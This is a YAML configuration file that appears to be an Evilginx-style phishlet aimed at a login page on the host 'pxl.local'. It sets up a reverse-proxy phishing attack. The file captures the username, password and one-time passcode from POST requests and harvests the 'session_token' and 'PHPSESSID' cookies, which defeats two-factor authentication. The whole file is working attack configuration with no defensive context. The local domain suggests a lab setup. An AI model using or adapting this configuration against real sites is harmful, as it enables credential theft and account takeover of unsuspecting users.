min_ver: '3.0.0'
author: 'vndck'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'pxl.local', session: true, is_landing: false}
  
sub_filters:
  - {triggers_on: 'pxl.local', orig_sub: 'login', domain: 'pxl.local', search: 'https://{hostname}/index.php', replace: 'https://{hostname}/index.php', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}

auth_tokens:
  - domain: 'pxl.local'
    keys: ['session_token', 'PHPSESSID']

credentials:
  otp:
    key: 'otp'  
    search: '(.*)'
    type: 'post'
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/admin.php'

login:
  domain: 'pxl.local'
  path: '/index.php'
